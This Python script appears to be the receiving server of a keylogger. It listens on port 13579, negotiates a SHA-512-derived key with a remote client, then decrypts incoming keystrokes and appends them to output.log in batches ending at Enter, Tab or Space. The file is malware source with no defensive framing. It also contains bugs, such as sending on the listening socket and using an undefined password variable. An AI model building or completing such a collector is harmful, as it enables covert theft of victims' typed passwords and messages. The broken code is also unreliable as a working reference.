#!/usr/bin/env python3

import socket
import sys
import hashlib
from pyaes256 import PyAES256

def passwd(client, server):
    global enc
    global hashed
    enc = PyAES256()
    password = ""

    # Generate the password for the AES encryption
    for letter in server:
        password = password + str(ord(letter))
    password = password + "-_-"
    for letter in client:
        password = password + letter

    # Hash it with SHA512
    # Note: Still not convinced bogosorting could help bullshit it
    hashed = hashlib.sha512(password.encode("utf-8")).hexdigest()
    return hashed

def decrypt(sequence, password):
    return enc.decrypt(sequence, password)

def log(sequence):
    print(''.join(sequence))
    with open('output.log', 'a') as pressedKeys:
        pressedKeys.write('\n'.join(sequence))

def begin(address, port=13579):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as srv:
        srv.bind((address, port))
        srv.listen()
        print(f"Waiting for a connection on {address}:{port}...")
        conn, addr = srv.accept()
        print(f"Connection from {addr}")
        client = conn.recv(2048).decode('utf-8')

        password = passwd(client, socket.gethostname())
        print(client)
        srv.send(password.encode('utf-8'))

        return conn

def main(srv):
    loggedKeys = []
    while True:
        recv = srv.recv(2048).decode('utf-8')

        if recv:
            data = decrypt(recv, password)
            loggedKeys.append(data)

            if loggedKeys[-1] == '[Key.enter]' or loggedKeys[-1] == '[Key.tab]' or loggedKeys[-1] == '[Key.space]':
                log(loggedKeys)
                loggedKeys = []

if __name__ == "__main__":
    server = begin('0.0.0.0')
    try:
        main(server)
    except KeyboardInterrupt:
        print("Exiting...")
        server.close()
        sys.exit()